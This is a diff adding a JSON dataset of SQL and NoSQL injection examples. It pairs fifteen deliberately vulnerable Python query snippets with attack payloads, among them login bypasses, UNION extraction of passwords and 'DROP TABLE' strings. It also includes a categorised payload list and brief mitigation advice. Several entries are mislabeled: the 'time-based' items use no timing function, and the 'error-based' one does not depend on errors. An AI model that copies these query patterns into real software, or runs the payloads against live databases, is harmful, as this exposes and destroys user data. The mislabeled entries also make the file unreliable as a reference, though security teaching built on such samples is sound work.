@@ -1,0 +1,223 @@
+{
+  "metadata": {
+    "description": "SQL Injection Vulnerable Code Dataset",
+    "version": "1.0",
+    "total_examples": 15,
+    "categories": [
+      "String Concatenation",
+      "Dynamic Query Construction",
+      "Input Validation Bypasses",
+      "Authentication Bypasses",
+      "Data Extraction",
+      "Blind SQL Injection",
+      "Time-based Injection",
+      "Union-based Injection",
+      "Error-based Injection",
+      "Boolean-based Injection",
+      "NoSQL Injection",
+      "Framework-specific",
+      "Real-world Patterns"
+    ]
+  },
+  "examples": [
+    {
+      "category": "String Concatenation",
+      "language": "Python",
+      "vulnerability_type": "Login Bypass",
+      "code": "query = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"",
+      "description": "Direct string interpolation in login query",
+      "payload": "admin' OR '1'='1",
+      "severity": "Critical",
+      "explanation": "This vulnerability allows attackers to bypass authentication by injecting SQL code that makes the WHERE clause always true."
+    },
+    {
+      "category": "String Concatenation",
+      "language": "Python",
+      "vulnerability_type": "Data Extraction",
+      "code": "query = \"SELECT * FROM users WHERE id = \" + user_input",
+      "description": "String concatenation in WHERE clause",
+      "payload": "1 UNION SELECT 1,2,3,4",
+      "severity": "High",
+      "explanation": "Union-based injection allows attackers to extract data from other tables or execute arbitrary queries."
+    },
+    {
+      "category": "String Concatenation",
+      "language": "Python",
+      "vulnerability_type": "Search Injection",
+      "code": "query = \"SELECT * FROM products WHERE name LIKE '%\" + search_term + \"%'\"",
+      "description": "Search functionality with string concatenation",
+      "payload": "test' UNION SELECT 1,2,3,4 --",
+      "severity": "High",
+      "explanation": "Search functionality can be exploited to extract data or perform unauthorized operations."
+    },
+    {
+      "category": "String Concatenation",
+      "language": "Python",
+      "vulnerability_type": "INSERT Injection",
+      "code": "query = \"INSERT INTO users (name, email) VALUES ('\" + name + \"', '\" + email + \"')\"",
+      "description": "INSERT statement with string concatenation",
+      "payload": "test', 'test@test.com'); DROP TABLE users; --",
+      "severity": "Critical",
+      "explanation": "INSERT injection can lead to data manipulation, table deletion, or unauthorized data insertion."
+    },
+    {
+      "category": "String Concatenation",
+      "language": "Python",
+      "vulnerability_type": "UPDATE Injection",
+      "code": "query = \"UPDATE users SET name = '\" + new_name + \"' WHERE id = \" + user_id",
+      "description": "UPDATE statement with string concatenation",
+      "payload": "admin' WHERE id = 1 OR 1=1 --",
+      "severity": "High",
+      "explanation": "UPDATE injection can modify multiple records or escalate privileges."
+    },
+    {
+      "category": "Union-based Injection",
+      "language": "Python",
+      "vulnerability_type": "Data Extraction",
+      "code": "query = f\"SELECT id, name FROM users WHERE id = {user_input} UNION SELECT 1,2\"",
+      "description": "Union-based injection to extract data",
+      "payload": "1 UNION SELECT username,password FROM users",
+      "severity": "Critical",
+      "explanation": "Union-based injection allows attackers to combine results from multiple SELECT statements."
+    },
+    {
+      "category": "Time-based Injection",
+      "language": "Python",
+      "vulnerability_type": "Blind Injection",
+      "code": "query = f\"SELECT * FROM users WHERE id = 1 AND (SELECT COUNT(*) FROM users WHERE id = {user_input}) > 0\"",
+      "description": "Time-based blind SQL injection",
+      "payload": "1 AND (SELECT COUNT(*) FROM users) > 0",
+      "severity": "High",
+      "explanation": "Time-based injection uses timing differences to extract information when direct output is not available."
+    },
+    {
+      "category": "Error-based Injection",
+      "language": "Python",
+      "vulnerability_type": "Information Disclosure",
+      "code": "query = f\"SELECT * FROM users WHERE id = {user_input} AND (SELECT COUNT(*) FROM information_schema.tables) > 0\"",
+      "description": "Error-based injection to extract database information",
+      "payload": "1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0",
+      "severity": "High",
+      "explanation": "Error-based injection exploits database errors to extract information about the database structure."
+    },
+    {
+      "category": "Boolean-based Injection",
+      "language": "Python",
+      "vulnerability_type": "Blind Injection",
+      "code": "query = f\"SELECT * FROM users WHERE id = 1 AND (SELECT COUNT(*) FROM users) > {user_input}\"",
+      "description": "Boolean-based blind SQL injection",
+      "payload": "0",
+      "severity": "Medium",
+      "explanation": "Boolean-based injection uses true/false responses to extract information bit by bit."
+    },
+    {
+      "category": "Framework-specific",
+      "language": "Python/Django",
+      "vulnerability_type": "Raw SQL",
+      "code": "cursor.execute(f\"SELECT * FROM auth_user WHERE id = {user_id}\")",
+      "description": "Django raw SQL with string interpolation",
+      "payload": "1 OR 1=1",
+      "severity": "Critical",
+      "explanation": "Using raw SQL in Django bypasses the ORM's built-in protection mechanisms."
+    },
+    {
+      "category": "Framework-specific",
+      "language": "Python/Flask",
+      "vulnerability_type": "SQLAlchemy Raw SQL",
+      "code": "query = text(f\"SELECT * FROM users WHERE id = {user_id}\")",
+      "description": "Flask with SQLAlchemy raw SQL",
+      "payload": "1; DROP TABLE users; --",
+      "severity": "Critical",
+      "explanation": "Using raw SQL in SQLAlchemy bypasses the ORM's parameterized query protection."
+    },
+    {
+      "category": "NoSQL Injection",
+      "language": "Python/MongoDB",
+      "vulnerability_type": "Authentication Bypass",
+      "code": "query = f'{{\"username\": \"{username}\", \"password\": \"{password}\"}}'",
+      "description": "MongoDB authentication with string interpolation",
+      "payload": "admin\", \"$ne\": \"",
+      "severity": "Critical",
+      "explanation": "NoSQL injection can bypass authentication by manipulating query operators."
+    },
+    {
+      "category": "NoSQL Injection",
+      "language": "Python/MongoDB",
+      "vulnerability_type": "Data Extraction",
+      "code": "query = f'{{\"username\": \"{user_input}\"}}'",
+      "description": "MongoDB query with string interpolation",
+      "payload": "admin\", \"$where\": \"1==1\"",
+      "severity": "High",
+      "explanation": "NoSQL injection can execute arbitrary JavaScript code in MongoDB queries."
+    },
+    {
+      "category": "Real-world Patterns",
+      "language": "Python",
+      "vulnerability_type": "E-commerce Search",
+      "code": "query = f\"SELECT p.*, c.name FROM products p JOIN categories c ON p.category_id = c.id WHERE p.name LIKE '%{search_term}%'\"",
+      "description": "E-commerce product search with injection",
+      "payload": "test' UNION SELECT 1,2,3,4,5 --",
+      "severity": "High",
+      "explanation": "E-commerce search functionality is commonly vulnerable to SQL injection attacks."
+    },
+    {
+      "category": "Real-world Patterns",
+      "language": "Python",
+      "vulnerability_type": "Banking API",
+      "code": "query = f\"SELECT account_number, balance FROM accounts WHERE account_id = {account_id}\"",
+      "description": "Banking API with account query injection",
+      "payload": "1 UNION SELECT account_number,balance FROM accounts",
+      "severity": "Critical",
+      "explanation": "Banking applications are high-value targets for SQL injection attacks."
+    }
+  ],
+  "payloads": {
+    "authentication_bypass": [
+      "admin' OR '1'='1",
+      "admin' OR '1'='1' --",
+      "admin' OR '1'='1' #",
+      "' OR 1=1 --",
+      "' OR 1=1 #",
+      "admin' --",
+      "admin' #"
+    ],
+    "data_extraction": [
+      "1 UNION SELECT 1,2,3,4",
+      "1 UNION SELECT username,password FROM users",
+      "1 UNION SELECT table_name,column_name FROM information_schema.columns",
+      "1' UNION SELECT 1,2,3,4 --",
+      "1' UNION SELECT 1,2,3,4 #"
+    ],
+    "database_information": [
+      "1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0",
+      "1 AND (SELECT COUNT(*) FROM information_schema.columns) > 0",
+      "1 AND (SELECT COUNT(*) FROM users) > 0",
+      "1' AND (SELECT COUNT(*) FROM users) > 0 --"
+    ],
+    "time_based": [
+      "1 AND (SELECT COUNT(*) FROM users) > 0",
+      "1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0",
+      "1' AND (SELECT COUNT(*) FROM users) > 0 --",
+      "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
+    ],
+    "nosql_injection": [
+      "admin\", \"$ne\": \"",
+      "admin\", \"$gt\": \"",
+      "admin\", \"$lt\": \"",
+      "admin\", \"$where\": \"1==1\"",
+      "admin\", \"$regex\": \".*\""
+    ]
+  },
+  "mitigation_strategies": [
+    "Use parameterized queries/prepared statements",
+    "Input validation and sanitization",
+    "Use ORM frameworks with built-in protection",
+    "Implement proper error handling",
+    "Use least privilege database accounts",
+    "Regular security testing and code reviews",
+    "Input length restrictions",
+    "Whitelist validation for allowed characters",
+    "Use stored procedures",
+    "Implement proper authentication and authorization"
+  ]
+} 
